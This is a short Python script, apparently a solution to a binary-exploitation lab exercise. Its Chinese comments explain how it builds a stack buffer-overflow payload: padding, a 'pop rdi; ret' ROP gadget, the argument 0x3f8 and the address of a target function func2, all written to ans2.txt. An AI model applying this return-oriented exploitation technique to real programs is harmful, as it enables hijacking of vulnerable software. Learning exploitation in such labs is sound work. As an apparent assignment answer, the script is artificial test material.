import struct

# Padding 长度
# Buffer(rbp-8)到RetAddr(rbp+8)的距离是16字节
padding_len = 16
padding = b'A' * padding_len

# 构造 ROP 链
# Gadget: pop rdi; ret
pop_rdi_ret_addr = 0x4012c7

# 参数: func2要求参数为0x3f8
arg1 = 0x3f8

# 目标函数:func2
func2_addr = 0x401216

# 打包 Payload
# 栈结构: [Padding] + [pop_rdi_addr] + [0x3f8] + [func2_addr]
payload = padding
payload += struct.pack('<Q', pop_rdi_ret_addr) # 覆盖原本的返回地址
payload += struct.pack('<Q', arg1)             # 这个值会被pop到rdi寄存器中
payload += struct.pack('<Q', func2_addr)       # pop rdi后的ret会跳到这里

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)
    print(f"Payload generated: {len(payload)} bytes written to ans2.txt")